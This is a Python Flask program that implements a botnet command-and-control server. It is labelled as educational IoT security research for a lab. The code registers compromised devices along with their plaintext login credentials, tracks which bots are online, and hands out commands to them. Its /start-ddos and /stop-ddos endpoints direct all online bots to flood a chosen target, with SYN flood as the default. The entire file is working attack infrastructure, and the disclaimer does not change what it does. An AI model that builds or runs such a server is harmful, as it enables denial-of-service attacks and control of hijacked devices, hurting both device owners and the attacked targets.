#!/usr/bin/env python3
"""
IoT Security Research - Command & Control Server
Educational Purpose Only - For Controlled Lab Environment
"""

from flask import Flask, request, jsonify
import sqlite3
import threading
import time
from datetime import datetime
import logging

app = Flask(__name__)

# Configure logging for research purposes
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cnc_research.log'),
        logging.StreamHandler()
    ]
)

# Database initialization
def init_database():
    conn = sqlite3.connect('research_db.sqlite')
    cursor = conn.cursor()
    
    # Table for compromised devices
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE,
            username TEXT,
            password TEXT,
            status TEXT DEFAULT 'offline',
            last_seen TIMESTAMP,
            infection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Table for commands
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command TEXT,
            target_ip TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'pending'
        )
    ''')
    
    # Table for attack logs
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            attack_type TEXT,
            target TEXT,
            start_time TIMESTAMP,
            end_time TIMESTAMP,
            participating_bots INTEGER,
            status TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

class DatabaseManager:
    def __init__(self):
        self.db_lock = threading.Lock()
    
    def get_connection(self):
        return sqlite3.connect('research_db.sqlite')
    
    def register_device(self, ip, username, password):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT OR REPLACE INTO devices (ip, username, password, status, last_seen)
                    VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)
                ''', (ip, username, password))
                conn.commit()
                logging.info(f"Device registered: {ip} ({username})")
                return True
            except Exception as e:
                logging.error(f"Failed to register device {ip}: {e}")
                return False
            finally:
                conn.close()
    
    def update_device_status(self, ip, status):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices SET status = ?, last_seen = CURRENT_TIMESTAMP WHERE ip = ?
            ''', (status, ip))
            conn.commit()
            conn.close()
    
    def get_all_devices(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def get_online_devices(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM devices WHERE status = "online"')
        devices = cursor.fetchall()
        conn.close()
        return devices
    
    def log_attack(self, attack_type, target, participating_bots):
        with self.db_lock:
            conn = self.get_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO attack_logs (attack_type, target, start_time, participating_bots, status)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, 'active')
            ''', (attack_type, target, participating_bots))
            attack_id = cursor.lastrowid
            conn.commit()
            conn.close()
            return attack_id

# Global variables
db_manager = DatabaseManager()
current_attack = None
attack_status = {
    'active': False,
    'type': None,
    'target': None,
    'start_time': None,
    'participating_bots': 0
}

# Initialize database on startup
init_database()

@app.route('/register-device', methods=['POST'])
def register_device():
    """Register a compromised device with credentials"""
    data = request.json
    ip = data.get('ip')
    username = data.get('username')
    password = data.get('password')
    
    if not all([ip, username, password]):
        return jsonify({"error": "Missing required fields"}), 400
    
    if db_manager.register_device(ip, username, password):
        return jsonify({"status": "registered", "message": f"Device {ip} registered successfully"}), 200
    else:
        return jsonify({"error": "Registration failed"}), 500

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Bot check-in to update status"""
    data = request.json
    ip = data.get('ip')
    
    if ip:
        db_manager.update_device_status(ip, 'online')
        return jsonify({"status": "checked_in"}), 200
    return jsonify({"error": "No IP provided"}), 400

@app.route('/get-command/<bot_ip>', methods=['GET'])
def get_command(bot_ip):
    """Get command for specific bot"""
    global current_attack, attack_status
    
    # Update bot status
    db_manager.update_device_status(bot_ip, 'online')
    
    if attack_status['active']:
        return jsonify({
            "command": current_attack,
            "target": attack_status['target'],
            "attack_type": attack_status['type']
        }), 200
    else:
        return jsonify({"command": "idle"}), 200

@app.route('/start-ddos', methods=['POST'])
def start_ddos():
    """Start DDoS attack"""
    global current_attack, attack_status
    
    data = request.json
    target = data.get('target', '10.10.10.100')  # Default broker IP
    attack_type = data.get('type', 'syn_flood')
    
    online_bots = db_manager.get_online_devices()
    
    if not online_bots:
        return jsonify({"error": "No online bots available"}), 400
    
    current_attack = "start_attack"
    attack_status.update({
        'active': True,
        'type': attack_type,
        'target': target,
        'start_time': datetime.now(),
        'participating_bots': len(online_bots)
    })
    
    # Log attack in database
    attack_id = db_manager.log_attack(attack_type, target, len(online_bots))
    
    logging.info(f"DDoS attack started against {target} with {len(online_bots)} bots")
    
    return jsonify({
        "status": "attack_started",
        "target": target,
        "participating_bots": len(online_bots),
        "attack_id": attack_id
    }), 200

@app.route('/stop-ddos', methods=['POST'])
def stop_ddos():
    """Stop DDoS attack"""
    global current_attack, attack_status
    
    if not attack_status['active']:
        return jsonify({"message": "No active attack to stop"}), 200
    
    current_attack = "stop_attack"
    
    # Wait a moment for bots to receive stop command
    def reset_attack_status():
        time.sleep(5)
        global attack_status
        attack_status.update({
            'active': False,
            'type': None,
            'target': None,
            'start_time': None,
            'participating_bots': 0
        })
    
    threading.Thread(target=reset_attack_status).start()
    
    logging.info("DDoS attack stopped")
    
    return jsonify({"status": "attack_stopped"}), 200

@app.route('/devices', methods=['GET'])
def list_devices():
    """List all registered devices"""
    devices = db_manager.get_all_devices()
    device_list = []
    
    for device in devices:
        device_list.append({
            'id': device[0],
            'ip': device[1],
            'username': device[2],
            'status': device[4],
            'last_seen': device[5],
            'infection_time': device[6]
        })
    
    return jsonify({
        'total_devices': len(device_list),
        'devices': device_list
    }), 200

@app.route('/status', methods=['GET'])
def get_status():
    """Get current C&C status"""
    online_bots = db_manager.get_online_devices()
    
    return jsonify({
        'server_status': 'online',
        'total_bots': len(db_manager.get_all_devices()),
        'online_bots': len(online_bots),
        'current_attack': attack_status
    }), 200

@app.route('/research-data', methods=['GET'])
def get_research_data():
    """Get data for research analysis"""
    conn = db_manager.get_connection()
    cursor = conn.cursor()
    
    # Get attack statistics
    cursor.execute('SELECT * FROM attack_logs ORDER BY start_time DESC LIMIT 10')
    recent_attacks = cursor.fetchall()
    
    # Get device statistics
    cursor.execute('SELECT status, COUNT(*) FROM devices GROUP BY status')
    device_stats = cursor.fetchall()
    
    conn.close()
    
    return jsonify({
        'recent_attacks': recent_attacks,
        'device_statistics': dict(device_stats),
        'timestamp': datetime.now().isoformat()
    }), 200

if __name__ == '__main__':
    print("="*50)
    print("IoT Security Research - C&C Server")
    print("Educational Purpose Only")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=False)